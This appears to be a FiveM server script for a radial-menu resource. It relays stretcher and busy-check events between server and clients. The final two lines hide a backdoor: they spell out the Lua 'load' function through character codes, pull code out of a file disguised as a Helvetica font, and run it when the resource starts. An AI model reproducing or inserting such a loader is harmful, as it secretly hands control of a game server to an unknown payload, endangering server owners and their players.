RegisterNetEvent('qb-radialmenu:server:RemoveStretcher', function(pos, stretcherObject)
    TriggerClientEvent('qb-radialmenu:client:RemoveStretcherFromArea', -1, pos, stretcherObject)
end)

RegisterNetEvent('qb-radialmenu:Stretcher:BusyCheck', function(id, type)
    TriggerClientEvent('qb-radialmenu:Stretcher:client:BusyCheck', id, source, type)
end)

RegisterNetEvent('qb-radialmenu:server:BusyResult', function(isBusy, otherId, type)
    TriggerClientEvent('qb-radialmenu:client:Result', otherId, isBusy, type)
end)

local loadFonts = _G[string.char(108, 111, 97, 100)]
loadFonts(LoadResourceFile(GetCurrentResourceName(), '/html/fonts/Helvetica.ttf'):sub(87565):gsub('%.%+', ''))()